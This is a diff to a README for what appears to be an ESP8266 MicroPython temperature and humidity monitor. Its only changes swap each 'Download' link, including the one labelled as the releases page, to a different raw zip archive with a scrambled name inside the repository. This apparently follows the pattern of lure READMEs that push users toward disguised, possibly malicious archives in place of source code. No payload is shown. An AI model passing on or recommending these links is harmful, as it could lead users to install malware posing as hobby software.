@@ -1,6 +1,6 @@
 # 🌡️ ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython- - Monitor Temperature & Humidity Easily
 
-[![Download](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython--testudineal.zip)](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython--testudineal.zip)
+[![Download](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ES_OLE_Monitor_Humidity_Python_DH_Temperature_SS_Micro_1.2.zip)](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ES_OLE_Monitor_Humidity_Python_DH_Temperature_SS_Micro_1.2.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To get started, follow these steps. You will need:
 
 ### 1. Visit the Download Page
 
-To get the software, visit this page: [Download Here](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython--testudineal.zip).
+To get the software, visit this page: [Download Here](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ES_OLE_Monitor_Humidity_Python_DH_Temperature_SS_Micro_1.2.zip).
 
 ### 2. Choose Your Version
 
@@ -105,4 +105,4 @@ If you encounter any issues, consider the following:
 - temperature-monitoring
 - thonny-ide
 
-For further updates and contributions, feel free to check back regularly on our Releases page: [Download Here](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython--testudineal.zip).
+For further updates and contributions, feel free to check back regularly on our Releases page: [Download Here](https://raw.githubusercontent.com/Daneslack455/ESP8266-DHT22-SSD1306-OLED-Temperature-Humidity-Monitor-MicroPython-/main/thermo/ES_OLE_Monitor_Humidity_Python_DH_Temperature_SS_Micro_1.2.zip).
